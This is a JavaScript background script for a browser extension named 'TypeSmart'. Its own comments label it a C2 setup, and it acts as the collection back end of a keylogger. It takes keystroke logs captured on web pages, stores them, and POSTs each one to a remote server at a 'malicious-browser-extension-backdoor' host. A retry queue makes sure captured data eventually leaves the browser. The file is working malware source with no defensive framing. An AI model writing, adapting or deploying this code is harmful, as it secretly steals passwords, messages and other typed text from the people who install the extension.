// ============================================================================
// Cross-Browser API Compatibility
// ============================================================================
const API = typeof browser !== "undefined" ? browser : chrome;
if (!API) {
  throw new Error("[TypeSmart bg] Neither browser nor chrome API available!");
}
// ============================================================================
// ️ SERVER CONFIGURATION — Remote Cloud C2 Setup
// ============================================================================
// UPDATE THIS with your actual Glitch/Render URL
const SERVER_URL =
  "https://malicious-browser-extension-backdoor.onrender.com/api/collect";
const SERVER_AUTH_TOKEN = null;
// ============================================================================
// Constants
// ============================================================================
const STORAGE_KEY = "ts_log";
const FAILED_QUEUE_KEY = "ts_failed_queue"; // stores entries that failed to send
const MSG_TYPES = {
  LOG_KEYS: "LOG_KEYS",
  EXPORT: "EXPORT",
  CLEAR: "CLEAR",
  PING: "PING",
};
// ============================================================================
// Helper: Send data to external server
// ============================================================================
async function sendToServer(entry) {
  const headers = {
    "Content-Type": "application/json",
  };
  // Attach auth token if provided
  if (SERVER_AUTH_TOKEN && SERVER_AUTH_TOKEN !== "YOUR_AUTH_TOKEN_HERE") {
    headers["Authorization"] = `Bearer ${SERVER_AUTH_TOKEN}`;
  }
  const response = await fetch(SERVER_URL, {
    method: "POST",
    headers,
    body: JSON.stringify(entry),
  });
  if (!response.ok) {
    throw new Error(`Server responded with status ${response.status}`);
  }
  return await response.json();
}
// ============================================================================
// Helper: Retry failed entries from the queue
// ============================================================================
async function retryFailedQueue() {
  try {
    const result = await API.storage.local.get(FAILED_QUEUE_KEY);
    const queue = result[FAILED_QUEUE_KEY] || [];
    if (queue.length === 0) return;
    console.log(`[TypeSmart bg] Retrying ${queue.length} failed entries...`);
    const stillFailed = [];
    for (const entry of queue) {
      try {
        await sendToServer(entry);
        console.log("[TypeSmart bg] Retry succeeded for entry:", entry.url);
      } catch (err) {
        console.warn("[TypeSmart bg] Retry still failed:", err.message);
        stillFailed.push(entry); // keep for next retry
      }
    }
    await API.storage.local.set({ [FAILED_QUEUE_KEY]: stillFailed });
  } catch (err) {
    console.error("[TypeSmart bg] retryFailedQueue error:", err.message);
  }
}
// ============================================================================
// Helper: Add entry to failed queue (when server is unreachable)
// ============================================================================
async function addToFailedQueue(entry) {
  try {
    const result = await API.storage.local.get(FAILED_QUEUE_KEY);
    const queue = result[FAILED_QUEUE_KEY] || [];
    queue.push(entry);
    // Cap the failed queue to 500 entries to avoid bloating storage
    const trimmed = queue.slice(-500);
    await API.storage.local.set({ [FAILED_QUEUE_KEY]: trimmed });
    console.warn(
      `[TypeSmart bg] Entry queued for retry (queue size: ${trimmed.length})`,
    );
  } catch (err) {
    console.error("[TypeSmart bg] addToFailedQueue error:", err.message);
  }
}
// ============================================================================
// Helper: Periodic cleanup (prevents storage from growing forever)
// ============================================================================
async function cleanupOldLogs() {
  try {
    const result = await API.storage.local.get(STORAGE_KEY);
    let entries = result[STORAGE_KEY] || [];
    const cutoff = Date.now() - 7 * 24 * 60 * 60 * 1000; // 7 days
    entries = entries.filter((entry) => {
      try {
        const parsed = JSON.parse(entry);
        return parsed.timestamp > cutoff;
      } catch (e) {
        return false;
      }
    });
    if (entries.length > 2000) {
      entries = entries.slice(-2000);
    }
    await API.storage.local.set({ [STORAGE_KEY]: entries });
    console.log(`[TypeSmart bg] Cleanup done — ${entries.length} entries kept`);
  } catch (err) {
    console.error("[TypeSmart bg] Cleanup error:", err.message);
  }
}
// ============================================================================
// Message Handlers
// ============================================================================
async function handleLogKeys(payload, sendResponse) {
  try {
    const entry = JSON.parse(payload);
    console.log("[TypeSmart bg] Received keystrokes for:", entry.url);
    // ── 1. Save locally ───────────────────────────────────────────────────
    const result = await API.storage.local.get(STORAGE_KEY);
    let entries = result[STORAGE_KEY] || [];
    entries.push(payload);
    await API.storage.local.set({ [STORAGE_KEY]: entries });
    // ── 2. Send to external server ────────────────────────────────────────
    try {
      await sendToServer(entry);
      console.log("[TypeSmart bg] Entry sent to server successfully ");
    } catch (serverErr) {
      console.warn(
        "[TypeSmart bg] Server send failed, queuing for retry:",
        serverErr.message,
      );
      await addToFailedQueue(entry); // don't lose data — queue it
    }
    sendResponse({ success: true, count: entries.length });
  } catch (err) {
    console.error("[TypeSmart bg] handleLogKeys error:", err.message);
    sendResponse({ success: false, error: err.message });
  }
}
async function handleExport(sendResponse) {
  try {
    const result = await API.storage.local.get(STORAGE_KEY);
    const entries = result[STORAGE_KEY] || [];
    sendResponse({ success: true, entries: entries });
  } catch (err) {
    console.error("[TypeSmart bg] handleExport error:", err.message);
    sendResponse({ success: false, error: err.message });
  }
}
async function handleClear(sendResponse) {
  try {
    await API.storage.local.remove(STORAGE_KEY);
    await API.storage.local.remove(FAILED_QUEUE_KEY); // also clear failed queue
    console.log("[TypeSmart bg] All logs cleared ");
    sendResponse({ success: true });
  } catch (err) {
    console.error("[TypeSmart bg] handleClear error:", err.message);
    sendResponse({ success: false, error: err.message });
  }
}
async function handlePing(sendResponse) {
  try {
    const result = await API.storage.local.get(STORAGE_KEY);
    const entries = result[STORAGE_KEY] || [];
    const failedResult = await API.storage.local.get(FAILED_QUEUE_KEY);
    const failedQueue = failedResult[FAILED_QUEUE_KEY] || [];
    sendResponse({
      status: "alive",
      entryCount: entries.length,
      failedQueueCount: failedQueue.length, // expose queue size in ping
    });
  } catch (err) {
    sendResponse({ status: "alive", entryCount: -1, failedQueueCount: -1 });
  }
}
// ============================================================================
// Central Message Router
// ============================================================================
function onMessageRouter(message, sender, sendResponse) {
  console.log("[TypeSmart bg] Received message:", message.type);
  switch (message.type) {
    case MSG_TYPES.LOG_KEYS:
      handleLogKeys(message.payload, sendResponse);
      break;
    case MSG_TYPES.EXPORT:
      handleExport(sendResponse);
      break;
    case MSG_TYPES.CLEAR:
      handleClear(sendResponse);
      break;
    case MSG_TYPES.PING:
      handlePing(sendResponse);
      break;
    default:
      console.warn("[TypeSmart bg] Unknown message type:", message.type);
      sendResponse({ error: "Unknown message type: " + message.type });
  }
  return true;
}
// ============================================================================
// Initialise Background Script
// ============================================================================
function init() {
  API.runtime.onMessage.addListener(onMessageRouter);
  console.log(
    "%c[TypeSmart bg] Background script initialised ",
    "color: #00ff00; font-weight: bold",
  );
  console.log("[TypeSmart bg] Listening for:", Object.values(MSG_TYPES));
  console.log("[TypeSmart bg] Server endpoint:", SERVER_URL);
  // Run local cleanup on startup
  cleanupOldLogs();
  // Retry any previously failed server sends every 5 minutes
  setInterval(retryFailedQueue, 5 * 60 * 1000);
  // Run local cleanup every hour
  setInterval(cleanupOldLogs, 60 * 60 * 1000);
}
init();
